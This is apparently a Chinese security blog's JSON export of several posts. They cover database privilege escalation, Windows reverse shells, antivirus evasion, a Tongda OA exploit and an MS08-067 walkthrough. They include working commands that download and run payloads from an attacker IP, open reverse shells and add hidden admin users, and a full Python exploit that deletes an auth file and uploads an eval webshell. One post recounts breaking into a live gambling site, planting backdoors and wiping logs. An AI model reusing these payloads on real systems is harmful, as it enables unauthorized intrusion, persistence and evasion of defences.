2. 判断数据库中是否存在 xp_cmdshell语法： 1and 1&#x3D;(select count(*) from master.dbo.sysobjects where xtype &#x3D; &#39;x&#39; and name &#x3D; &#39;xp_cmdshell&#39;)--+ 页面正常返回，说明数据库中存在组件 xp_cmdshell 3. 判断 xp_cmdshell 是否启用语法： 12# mssql 支持多条语句同时执行，用分号 ; 隔开;exec master..xp_cmdshell \"net user name password /add\"--+ 出现这种报错，说明 xp_cmdshell 没有开启 4. 开启 xp_cmdshell先执行如下，这里用到了 sp_configure 方法： 1;exec sp_configure &#39;show advanced options&#39;,1;reconfigure;exec sp_configure &#39;xp_cmdshell&#39;,1;reconfigure;--+ 再执行： 1;exec master..xp_cmdshell &quot;ver&quot;--+ 执行完这两句都没有报错，说明 xp_cmdshell 已经开启成功 5. 添加系统管理员用户，提权12345# 添加用户;exec master..xp_cmdshell &quot;net user pei password &#x2F;add&quot;--+# 用户添加到管理员组;exec master..xp_cmdshell &quot;net localgroup administrators pei &#x2F;add&quot;--+ 使用添加的用户登陆远程桌面成功，执行 net user pei 可以看到是在管理员组","categories":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"数据库提权(一) mysql UDF 提权","slug":"数据库提权(一) mysql UDF 提权","date":"2020-10-05T04:00:00.000Z","updated":"2020-11-27T13:11:41.405Z","comments":true,"path":"2020/10/05/数据库提权(一) mysql UDF 提权/","link":"","permalink":"http://yoursite.com/2020/10/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83(%E4%B8%80)%20mysql%20UDF%20%E6%8F%90%E6%9D%83/","excerpt":"","text":"1. udf（user defined function，用户定义函数）为用户提供了一种高效创建函数的方式。udf设计的初衷是为了给用户提供一个扩展MySQL函数的便利机会，方便用户进行复杂的查询处理，但这也为恶意攻击者通过udf提升权限提供了可能。 不同版本提权 udf.dll 文件存放的目录不一样 Windows2003 操作系统导出 udf.dll 到 C:\\windows\\ 目录下 在 MySQL 5.1 版本及以后的环境下，udf 提权时需要将 udf.dll 导出到 mysql 安装目录 \\lib\\plugin\\ 目录下。 2.NTFS ADS 创建目录在 MySQL5.1 以后的环境下只有将 udf.dll 文件导出到 mysql 安装目录 \\lib\\plugin\\ 目录下才能成功，但是很多时候 mysql 安装目录下并不存在lib目录，mysql 文件操作也并不能直接创建目录，此时需要通过 NTFS ADS 流来创建目录。每个文件数据流的完整格式如下： 1&lt;filename&gt;:&lt;stream name&gt;:&lt;stream type&gt; 只有一个data流时，stream name通常可以省略。当 stream type为 $INDEX_ALLOCATION 时，表明该该数据流的宿主是文件夹。所以可以通过 mysql 导出数据到 directory_path:: $INDEX_ALLOCATION 文件的方法来创建 directory_path 目录。 查看 mysql 目录 1select @@basedir; 利用 NTFS ADS 创建 lib 目录，注意 windows 环境下目录路径需要转义 1select &#39;xxx&#39; into outfile &#39;C:\\\\mysql\\\\mysql-5.1.40-win32\\\\lib\\::$INDEX_ALLOCATION&#39;; 利用 NTFS ADS 创建 plugin 目录 1select &#39;xxx&#39; into outfile &#39;C:\\\\mysql\\\\mysql-5.1.40-win32\\\\lib\\\\plugin\\::$INDEX_ALLOCATION&#39;; UDF 提权步骤前提：信息收集通过前期信息收集获得系统版本、mysql 版本、mysql 是否允许远程登陆、账号密码数据库名等。根据是否允许远程登陆可以分为以下两种方式来 udf 提权 远程连接 mysql 提权 通过 webshell 提权 还需要用到 udf 提权的文件，下载地址：天翼云盘 方法一：远程连接 Mysql 提权前提是目标主机开启了 MySQL 远程连接，并且通过前期信息收集已经获得 MySQL 数据库连接的用户名和密码信息，通过 udf 手工提权获得操作系统管理员权限。 在靶机上模拟目标机器开启 mysql 远程连接，依次执行以下五条命令来开启 1234567891011121314# 进入 mysql 库use mysql;# 将 user 表中 root 用户的登陆 host 修改为 %，即任意 IPupdate user set host = '%' where user = 'root';# 查询修改结果select host,user,password from user;# 授权 root 用户远程登陆，@ 前面是用户名，BY 后面是密码，这里用户名密码都是 rootGRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'root' WITH GRANT OPTION;# 刷新配置使立即生效FLUSH PRIVILEGES; 1.在攻击机上远程连接 mysql，这里使用 navicat 连接 2.创建临时表，用来存放提权的 udf.dll 文件数据 1CREATE TABLE temp_udf(udf BLOB); 表名为 temp_udf, 表内有一个字段 udf 3.将 udf.dll 二进制数据插入临时表 temp_udf 中 1INSERT into temp_udf values (CONVERT($binaryCode,CHAR)); 其中 $binaryCode 为已经转换好的 udf.txt 文件中复制的十六进制内容。 4.将 udf.dll 从临时表 temp_udf 导出到 mysql 安装目录下的 lib/plugin/udf.dll 文件中 1SELECT udf FROM Temp_udf INTO DUMPFILE &quot;C:&#x2F;mysql&#x2F;mysql-5.1.40-win32&#x2F;lib&#x2F;plugin&#x2F;udf.dll&quot; 5.创建用户自定义函数cmdshell，调用第四步保存在安装目录下的 .dll 文件，通过这个函数来执行系统命令 1create function cmdshell returns string soname &#39;udf.dll&#39; 6.添加用户并加入到管理员组 1select cmdshell(&#39;net user pei 123456 &#x2F;add &amp; net localgroup administrators pei &#x2F;add&#39;) 用户名 pei, 密码 123456 7.查看 pei 用户是否加入 administrators 管理员用户组 1select cmdshell(&#39;net localgroup administrators&#39;) 在 sql 执行结果上右键保存到本地的 txt 文件，就能看到命令执行的内容 用户 pei 成功添加到管理员组，提权成功 8.擦除痕迹 12345# 删除临时表DROP TABLE temp_udf; # 删除创建的自定义函数drop function cmdshell; 方法二：通过 Webshell 提权如果已经获取webshell权限，可以上传php脚本，但是目标网站的安全策略设置严谨，无法在 webshell 上直接执行操作系统命令，udf 提权能够将 webshell 权限提升为管理员权限。 1.通过 webshell 上传 moon.php 文件到网站目录，该文件集成了MySQL udf提权的所有命令，可以实现 udf 半自动提权。 2.访问 http://xxx.xx.xx.xx/moon.php， 使用前面信息收集时候获取到的目标数据库用户名、密码和数据库信息登录进去 3.导出 udf.dll，mysql 版本为 5.1.40-community，需要将 udf.dll 导出到 mysql 安装目录 4.创建 mysql自定义函数 cmdshell 5.执行下面的 sql 语句, 通过上一步创建的 cmdshell 函数执行系统命令 1select cmdshell(&#39;net user pei 123456 &#x2F;add &amp; net localgroup administrators pei &#x2F;add&#39;) 添加用户 pei 密码为 123456，并将该用户加入到 administrators 管理员组 6.查看系统用户 1select cmdshell(&#39;net localgroup administrators&#39;) 新建的 pei 用户成功添加到管理员组中，拥有系统管理员权限，提权成功","categories":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"Windows 反弹 shell","slug":"windows反弹shell","date":"2020-10-01T04:00:00.000Z","updated":"2020-11-22T08:05:28.813Z","comments":true,"path":"2020/10/01/windows反弹shell/","link":"","permalink":"http://yoursite.com/2020/10/01/windows%E5%8F%8D%E5%BC%B9shell/","excerpt":"","text":"以下本地环境攻击机的 IP ：192.168.1.227 介绍几种 Windows 反弹 shell 的方式，有的是 win 系统自带，有些是第三方工具/脚本，实战中根据情况选择使用。 一、NC 反弹 shell先把 nc 上传到目标 windows 机器 NC 正向 shell 被控端： 1nc -lvvp 6666 -e cmd.exe 控制端： 1nc 192.168.1.62 6666 原理：被控端将cmd.exe重定向到本地的6666端口，控制端主动连接被控端的6666端口，即可获得shell NC 反向 shell 控制端： 1nc -lvvp 6666 被控端： 1nc -e cmd.exe 192.168.1.227 6666 原理：被控端将cmd.exe重定向到控制端的6666端口，控制端只需要监听本地的6666端口，即可获得shell。 二、Mshta 反弹 shell Mshta.exe 是用于负责解释运行 HTA(HTML应用程序)文件的 Windows OS 实用程序。 可以运行 JavaScript 或 VBScript 的 HTML 文件。 1. 通过 Metasploit 的 hta_server模块发起 HTA 攻击12345use exploit&#x2F;windows&#x2F;misc&#x2F;hta_servermsf exploit(windows&#x2F;misc&#x2F;hta_server) &gt; set srvhost 192.168.1.227msf exploit(windows&#x2F;misc&#x2F;hta_server) &gt; exploit –jmshta.exe http:&#x2F;&#x2F;192.168.1.227:8080&#x2F;gwm6lZr.hta 在目标机器上命令行中使用 mshta 执行 msf 生成的 URL，msf 就能获得 session 1mshta.exe http:&#x2F;&#x2F;192.168.1.227:8080&#x2F;gwm6lZr.hta 2. 通过 Msfvenom 生成恶意 HTA 文件发起攻击先使用 msfvenom 生成一个恶意 hta 文件 1msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.227 lport&#x3D;4444 -f hta-psh -o 1.hta msf 建立一个反向监听 1msf5 &gt; handler -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp -H 192.168.1.227 -P 4444 python 开启web服务，使目标机器可以访问这个恶意文件 1python –m http.server 8000 在目标机器上命令行中使用 mshta.exe 请求并运行攻击机器上的 hta 文件 1mshta.exe http:&#x2F;&#x2F;192.168.1.227:8000&#x2F;1.hta 三、Rundll32 反弹shell Rundll32.exe与Windows操作系统相关，它允许调用从DLL导出的函数(16位或32位)，并将其存储在适当的内存库中。 通过 Metasploit 的 smb_delivery 模块发起Rundll32攻击12345use exploit&#x2F;windows&#x2F;smb&#x2F;smb_deliverymsf exploit(windows&#x2F;smb&#x2F;smb_delivery) &gt; set srvhost 192.168.1.227msf exploit(windows&#x2F;smb&#x2F;smb_delivery) &gt; exploit –jrundll32.exe \\\\192.168.1.227\\obmPU\\test.dll,0 在目标机器命令行中执行 msf 生成的这条命令，msf 就能获得 session 1rundll32.exe \\\\192.168.1.227\\obmPU\\test.dll,0 四、Regsvr32 反弹shell Regsvr32.exe是一个命令行应用程序，用于注册和注销OLE控件，如Windows注册表中的dll和ActiveX控件。 Regsvr32.exe安装在Windows XP和Windows后续版本的 %systemroot%\\System32 文件夹中。 语法: Regsvr32 [/s] [/u] [/n][/i[:cmdline]] &lt;dllname&gt; 1234&#x2F;u - 注销服务器&#x2F;i - 调用DllInstall传递一个可选的[cmdline];当它与&#x2F;u一起使用时，它调用dll来卸载&#x2F;n - 不要调用DllRegisterServer; 此选项必须与&#x2F;i一起使用&#x2F;s - 沉默; 不显示消息框&#96; msf 使用 web_delivery 模块，设置参数并执行，生成一条 regsvr32 命令 12345678use exploit&#x2F;multi&#x2F;script&#x2F;web_deliverymsf exploit (web_delivery)&gt; set srvhost 192.168.1.227msf exploit (web_delivery)&gt; set target 3msf exploit (web_delivery)&gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcpmsf exploit (web_delivery)&gt; set lhost 192.168.1.227msf exploit (web_delivery)&gt; exploit –jregsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.1.227:8081&#x2F;du3uxIZOGuCH0ZV.sct scrobj.dll 在目标机器命令行中执行 msf 生成的这条命令，msf 就能获得 session 1regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.1.227:8081&#x2F;du3uxIZOGuCH0ZV.sct scrobj.dll 五、Certuil 反弹shell Certutil.exe是作为证书服务的一部分安装的命令行程序。可以使用此工具在目标计算机中执行恶意的exe文件以获得meterpreter会话。Certutil 也常用来向目标机器上传文件 msfvenom 生成一个恶意的 exe 文件 1msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.227 lport&#x3D;1234 -f exe &gt; shell.exe msf 建立一个反向监听 1msf5 &gt; handler -p windows&#x2F;meterpreter&#x2F;reverse_tcp -H 192.168.1.227 -P 1234 python 开启web服务，使目标机器可以访问这个恶意文件 1python –m http.server 8000 在目标机器上命令行中使用 certutil.exe 请求并运行攻击机器上的 exe 文件, &amp; 符号之前是在上传文件，&amp; 符号之后的 shell.exe 是上传完毕后执行它 1certutil.exe -urlcache -split -f http:&#x2F;&#x2F;192.168.1.227:8000&#x2F;shell.exe shell.exe &amp; shell.exe 需要注意的是，使用 certutil 上传文件会在目标机器上留下缓存，防止管理员发现可以使用下面命令清除缓存 1certutil.exe -urlcache -split -f http:&#x2F;&#x2F;192.168.1.227:8000&#x2F;shell.exe delete 六、Powershell 反弹shell1. 通过 PowerShell 发动 Powercat 攻击 Powercat是PowerShell本地后门侦听器和反向shell工具，也称为修改版本的netcat，因为它集成支持经过编码的有效载荷。 下载 powercat.ps1： 1git clone https:&#x2F;&#x2F;github.com&#x2F;besimorhino&#x2F;powercat.git 攻击机使用 nc 监听 1234 端口 1nc -lvvp 1235 python 开启web服务，使目标机器可以访问这个 powercat.ps1 1python –m http.server 8000 在目标机器上执行 powershell 命令，攻击机上 nc 就能看到反弹的 shell 1powershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.1.227:8000&#x2F;powercat.ps1&#39;);powercat -c 192.168.1.227 -p 1235 -e cmd&quot; 2. 通过 PowerShell 启动 cscript.exe 攻击 PowerShell 允许客户端通过执行 cscript.exe 来运行 wsf、js 和 vbscript 脚本。 先使用 msfvenom 生成一个 vbs 恶意文件 1msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.227 lport&#x3D;1234 -f vbs &gt; 1.vbs msf 建立一个反向监听 1msf5 &gt; handler -p windows&#x2F;meterpreter&#x2F;reverse_tcp -H 192.168.1.227 -P 1234 python 开启web服务，使目标机器可以访问这个 1.vbs 1python –m http.server 8000 在目标机器上执行以下命令，msf 就可以看到反弹的session 1powershell.exe -c &quot;(New-Object System.NET.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.1.227:8000&#x2F;1.vbs&#39;,\\&quot;$env:temp\\test.vbs\\&quot;);Start-Process %windir%\\system32\\cscript.exe \\&quot;$env:temp\\test.vbs\\&quot;&quot; 3. 通过 PowerShell 启动 bat 文件攻击 PowerShell 允许客户端执行 bat 文件。 先使用 msfvenom 生成一个 bat 恶意文件 1msfvenom -p cmd&#x2F;windows&#x2F;powershell_reverse_tcp lhost&#x3D;192.168.1.227 lport&#x3D;1234 &gt; 1.bat msf 建立一个反向监听 1msf5 &gt; handler -p windows&#x2F;meterpreter&#x2F;reverse_tcp -H 192.168.1.227 -P 1234 python 开启web服务，使目标机器可以访问这个 1.vbs 1python –m http.server 8000 在目标机器上执行以下命令，msf 就可以看到反弹的session 1powershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.1.227:8000&#x2F;1.bat&#39;)&quot; 七、Msiexec 反弹 shell Windows 系统安装有一个 Windows 安装引擎，MSI 包使用 msiexe.exe 来解释安装。 先用 msfvenom 生成一个恶意 msi 文件 1msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.227 lport&#x3D;1237 -f msi &gt; 1.msi msf 建立一个反向监听 1msf5 &gt; handler -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp -H 192.168.1.227 -P 1237 python 开启web服务，使目标机器可以访问这个 1.vbs 1python –m http.server 8000 在目标机器上执行以下命令，msf 就能获取反弹的 session 1msiexec &#x2F;q &#x2F;i http:&#x2F;&#x2F;192.168.1.227:8000&#x2F;1.msi 其他：在线生成 shell 的网站https://krober.biz/misc/reverse_shell.php?ip=218.70.84.146&amp;port=443","categories":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"msf+python免杀360火绒","slug":"msf+python免杀360火绒","date":"2020-09-30T04:00:00.000Z","updated":"2020-10-23T01:42:59.801Z","comments":true,"path":"2020/09/30/msf+python免杀360火绒/","link":"","permalink":"http://yoursite.com/2020/09/30/msf+python%E5%85%8D%E6%9D%80360%E7%81%AB%E7%BB%92/","excerpt":"","text":"目标机器安装了 python 环境的话可以直接用 msf 的 exploit/multi/script/web_delivery 模块 + python 的 payload 来获取 meterpreter，并且通常情况下杀软不会拦截这种行为，但是如果目标机器没有 python 环境就比较难办了，把 py 脚本打包成 exe 可执行程序是个不错的选择 1. msf 生成 python 脚本1msfvenom -p python&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;10.10.235.129 lport&#x3D;8877 -f raw &gt; hacker.py 生成的代码如下 2. 打包成 exe准备一个 ico 的图标做伪装，我这里直接在 easyicon 网站搜索 QQ 影音下载一个，跟 python 脚本放在一个目录下 本地 python 环境下先安装好 pyinstaller 库，用来将 py 脚本打包成 exe 可执行程序 1python -m pip install pyinstaller 在当前路径执行打包命令 1pyinstaller -F -w --icon&#x3D;QQyingyin.ico hacker3.py -F 打包 -w 隐藏窗口，防止运行程序后打开黑色的窗口 –icon 指定图标 打包完成后会在当前目录生成以下文件，生成的 exe 文件在 dict 目录下 3. 杀软扫描火绒 360杀毒 360卫士云查杀 4. 监听目标kali 开启监听，把生成的 exe 文件传到目标机器并运行，成功拿到 session 123456use exploit&#x2F;multi&#x2F;handler set payload python&#x2F;meterpreter&#x2F;reverse_tcpset lhost 10.10.235.129set lport 8877set exitonsession false run -j 在持续操作的过程中 360 也没有拦截。","categories":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"免杀","slug":"免杀","permalink":"http://yoursite.com/tags/%E5%85%8D%E6%9D%80/"},{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"某博彩网站渗透实战","slug":"某博彩网站渗透实战","date":"2020-09-24T04:00:00.000Z","updated":"2020-10-11T10:23:44.726Z","comments":true,"path":"2020/09/24/某博彩网站渗透实战/","link":"","permalink":"http://yoursite.com/2020/09/24/%E6%9F%90%E5%8D%9A%E5%BD%A9%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/","excerpt":"","text":"本文原创首发投稿在合天智汇，仅限于技术讨论与分享，严禁用于非法途径。若读者因此作出任何危害网络安全行为后果自负。 前言最近听说用某棋牌产品建的站存在SQL注入，刚好别人发来一个 渗透惯用套路一把梭信息收集 -&gt; 漏洞探测/利用 -&gt; 提权/权限维持 -&gt; 清理痕迹 一、信息收集 浏览器访问主页初步发现系统：Windows server中间件 IIS7.5语言：ASPX 端口扫描1nmap -sV -T4 -p- 11x.xx.xxx.xx 开放的端口真不少其中web服务的有几个：80(当前主页)、81、82、88、4700181：是这个棋牌站的后台82：也是个后台，不知道是什么系统的后台，有验证码88/47001：访问失败 1433：数据库 mssql 还开了 139、445 但是被过滤了，不知道是不是有防火墙，后面再看 敏感目录扫描先用 Dirsearch 过一遍，前面搜集到网站语言是 aspx，加上 -e 指定语言 1python dirsearch.py -u http:&#x2F;&#x2F;11x.xx.xxx.xx -e aspx 再用 7kbscan 过一遍，毕竟这里面收集的都是国人常用的字典 /m/ 是用户注册页面，可能有用，先记着 /test.html是调起微信的入口，没啥用，可能是在手机端引导受害者聊天的吧 查IP北京某个运营商的服务器，菠菜在国内服务器建站挺大胆的 信息整理 估计就是个人建的小站，不去展开收集更过的东西了，免得打偏浪费时间 二、漏洞探测重点先放在前面找到的 81 端口，也就是网站的后台管理页面 没有验证码，用户名 / 密码随便写个 admin / admin，抓包 用户名加了个引号发送请求直接返回报错了，不出意外应该会有报错注入或者盲注啥的 兵分两路一路把这个数据包保存到本地 qipai.txt，用 sqlmap 去扫，前面已经知道是 mssql 数据库，加上 –dbms 参数指定数据库类型节约时间 1python sqlmap.py -r qipai.txt --dbms &quot;Microsoft SQL Server&quot; --dbs 另一路，把数据包发送到 intruder 模块去爆破密码，尝试了在浏览器随便输入用户名，提示 “用户名不存在”，输入 admin 的时候提示 “用户名或密码错误”，说明 admin 账户是存在的，只爆破密码就行 爆出密码 888999，弱口令，永远滴神！😁 成功登录后台 只有 69 个注册用户，剩下的全是机器人，这 69 个用户冲了 143 万？玩棋牌的都这么有钱吗，我欢乐斗地主都舍不得冲 6 块首充😥 赌博沾不得呀，这个老哥一天输了 2800，所有的输赢率管理员都可以在后台随意配置 在后台翻了半天没找到上传点，先放着 回到另一路 sqlmap 看看，确定存在注入，已经在慢慢跑库名了 跑出 16 个库，根据名字猜 RYPlatformManagerDB 库可能存着管理员的相关信息 跑表名 1python sqlmap.py -r qipai.txt --tables -D RYPlatformManagerDB 翻了半天就找到一个管理员的账号密码，就是前面 bp 爆破出来的那个，还有一些用户的信息，没啥更有价值的 1python sqlmap.py -r qipai.txt --is-dba 是 DBA 权限，尝试拿 shell，mssql 数据库直接用 sqlmap 爆破路径就行了 1python sqlmap.py -r qipai.txt --os-shell 用的盲注，时间较慢，经过漫长的等待终于成功拿 shell，渗透呐，表面上是个技术活，实际上是个体力活🤔 whoami 查看当前用户权限很小，只是个 mssql 数据库权限 Systeminfo 查看一下系统信息，可以看到系统是 64 位的 Windows server 2008 Cobaltstrike 生成攻击载荷，再目标机器上用 powershell 加载，目标机器成功上线 net user 查看用户 tasklist 查看进程，应该没有装杀软 net start 查看已开启的服务，可以看到防火墙是开启的，所以前面 nmap 扫描 445 等端口被过滤 关闭防火墙，额还没提权😮 三、提权/维权前面得知这个机器是 windows server 2008，尝试用土豆提权（MS16-075） 执行后稍等了一会儿，比较幸运，这个机器没打补丁，一次就提权成功，拿到 system 权限，开始为所欲为😊 进入文件管理，能看到前面信息收集时的 test.html 文件 netstat -ano 看一下端口开放情况，3389 没有开 手动开启一下 1REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f 可以访问远程桌面了 metasploite 上有很多不错的工具和命令，把目标机器上线到 msf 继续操作，通过 cs 上传一个 msfvenom 生成的马，msf 开启监听 msf 开启监听 在 cs 上运行上传的马 msf 成功拿到 shell，是继承的 system 权限 注：cs 可以直接派生 shell 给 msf，但是当时我尝试的老半天 msf 一直没有返回 session，所以才无奈先手动上传一个 msf 的马曲线救国 查看密码哈希，不能获取，因为msf的这个马是32位的，系统是64位的 ps 查看进程，在进程中找一个以 system 权限运行的 64 位的程序，迁移进程后再获取哈希 到在线破解哈希的网站查一下 administrator 的密码，密码不算复杂，几秒钟就查到了 成功登录远程桌面，拿下这个博彩网站的服务器 留两个后门，一个webshell，一个开机自启的nc用来反弹shell 四、清理痕迹，撤退meterpreter 的 clearv 命令一键清除 或者手动删除 Windows 日志 总结 所以赌博这东西碰都不要碰，看都不要看，一点好奇心都不要有，这些骗子割韭菜演都不带演的，就纯割，硬割。","categories":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"net user 被杀软拦截绕过方式","slug":"net user 被杀软拦截绕过方式","date":"2020-09-13T04:00:00.000Z","updated":"2020-09-12T16:34:49.419Z","comments":true,"path":"2020/09/13/net user 被杀软拦截绕过方式/","link":"","permalink":"http://yoursite.com/2020/09/13/net%20user%20%E8%A2%AB%E6%9D%80%E8%BD%AF%E6%8B%A6%E6%88%AA%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/","excerpt":"","text":"拿下目标机器后做权限维持，添加后门用户的时候经常会被火绒等杀软拦截，可以使用复制 net1 的方式绕过 C:\\Windows\\System32 目录下有 net.exe 和 net1.exe 文件，他俩是一样的，直接添加用户会被拦截 把 net1.exe 伪装成 txt 文件 12cd C:\\Windows\\System32copy net1.exe xxx.txt 用 xxx.txt 代替 net 命令来添加用户，不再拦截 123net user test1 passwd /add (会被拦截)net1 user test1 passwd /add （会被拦截）xxx.txt user test1 passwd /add （不会拦截） 注：试了下 360、安全狗 不行，这俩还是会拦截，其他的未测试","categories":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"权限维持","slug":"权限维持","permalink":"http://yoursite.com/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}]},{"title":"通达OA v11.6 任意文件删除+任意文件上传漏洞","slug":"通达OA v11.6 任意文件删除+任意文件上传漏洞","date":"2020-08-20T04:00:00.000Z","updated":"2020-08-23T05:06:52.923Z","comments":true,"path":"2020/08/20/通达OA v11.6 任意文件删除+任意文件上传漏洞/","link":"","permalink":"http://yoursite.com/2020/08/20/%E9%80%9A%E8%BE%BEOA%20v11.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4+%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"通达OA v11.6 版本存在任意文件删除和文件上传漏洞，攻击者可以删除 auth.inc.php 文件，这个文件是校验用户身份的，删除后用户权限验证等功能就会失效，然后配合文件上传漏洞上传 webshell 拿下服务器权限 环境准备 下文的复现 EXP 会删除服务器的 auth.inc.php 文件对系统造成破坏，一定在本机搭建环境复现 通达OA 11.6 安装包，下载完按照提示一步步安装即可天翼云: https://cloud.189.cn/t/u2eYvm6zIbEr 访问码: ht4b 搭建完成访问默认地址如下 http://127.0.0.1:80 getshellEXP 123456789101112131415161718192021222324252627import requeststarget=\"http://127.0.0.1:80/\"payload=\"&lt;?php eval($_REQUEST['a']);?&gt;\"print(\"[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA\")input(\"Press enter to continue\")print(\"[*]Deleting auth.inc.php....\")url=target+\"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php\"requests.get(url=url)print(\"[*]Checking if file deleted...\")url=target+\"/inc/auth.inc.php\"page=requests.get(url=url).textif 'No input file specified.' not in page: print(\"[-]Failed to deleted auth.inc.php\") exit(-1)print(\"[+]Successfully deleted auth.inc.php!\")print(\"[*]Uploading payload...\")url=target+\"/general/data_center/utils/upload.php?action=upload&amp;filetype=nmsl&amp;repkid=/.&lt;&gt;./.&lt;&gt;./.&lt;&gt;./\"files = &#123;'FILE1': ('hack.php', payload)&#125;requests.post(url=url,files=files)url=target+\"/_hack.php\"page=requests.get(url=url).textif 'No input file specified.' not in page: print(\"[+]Filed Uploaded Successfully\") print(\"[+]URL:\",url)else: print(\"[-]Failed to upload file\") 执行命令 1python tongda.py 执行完毕后返回上传的 webshell 路径 查看服务安装路径，webshell 在 webroot 根目录 蚁剑连接 修复方法 升级到最新版本 v11.7 删除这个文件 /module/appbuilder/assets/print.php，任意文件删除漏洞就是它导致的 参考连接：https://drivertom.blogspot.com/2020/08/oa116-preauth-rce-0day.html?m=1","categories":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"windows主机渗透 - MS08-067","slug":"Windows主机渗透-MS08-067","date":"2020-07-03T04:00:00.000Z","updated":"2020-07-05T02:54:56.241Z","comments":true,"path":"2020/07/03/Windows主机渗透-MS08-067/","link":"","permalink":"http://yoursite.com/2020/07/03/Windows%E4%B8%BB%E6%9C%BA%E6%B8%97%E9%80%8F-MS08-067/","excerpt":"","text":"MS08-067是一个比较老比较经典的windows漏洞，该漏洞是出现在 445 端口的 SMB 服务上，可能允许远程执行代码。 在 Windows 2000、Windows XP 和 Windows Server 2003 系统上，攻击者可能未经身份验证即可利用此漏洞运行任意代码。 环境准备目标机器：10.1.1.130 (windows xp 简中，防火墙未开启)攻击机器：10.1.1.128 (kali) nmap 探测目标主机检查端口开放情况1nmap -sV -T4 10.1.1.130 扫描结果可以看出，目标机器开启了445端口 检查是否存在 SMB 漏洞1nmap --script&#x3D;smb-check-vulns 10.1.1.130 使用 nmap 的 smb-check-vulns 脚本检查出目标机器存在几个 SMB 服务的漏洞，其中包括 MS08-067 检测主机系统版本1nmap -O 10.1.1.130 使用 nmap 的 -O 参数检测到目标机器的系统是 windows xp SP2 或者 SP3 metasploit 攻击目标主机1、kali 上启动 metasploit，使用命令 search 08-067 搜索 ms08-067 可以利用的模块 查询到一个可利用的模块 2、输入命令 use exploit/windows/smb/ms08_067_netapi，使用这个模块 3、输入命令 set payload windows/meterpreter/reverse_tcp ，设置一个反向连接的 payload 4、输入命令 show options 查看需要设置的选项 标注 YES 的是需要手动设置的选项，其中有些是已经默认设置了的，这里只需要设置 RHOST 和 LHOST 即可，RHOST 是目标机器的 IP，LHOST 是 kali 机器的IP 5、前面 nmap 扫描得知目标机器的版本是 windows xp SP2 或者 SP3，先将 target 设置成 windows xp SP2 测试，对应的 id 是 17，输入命令 set target 17，然后 run 开始攻击 攻击失败，没有获取到 meterpreter，目标机器的系统应该不是 SP2，这里有一个坑点，target 设置错误攻击失败后，目标机器会报出下图的错误，会导致 kali 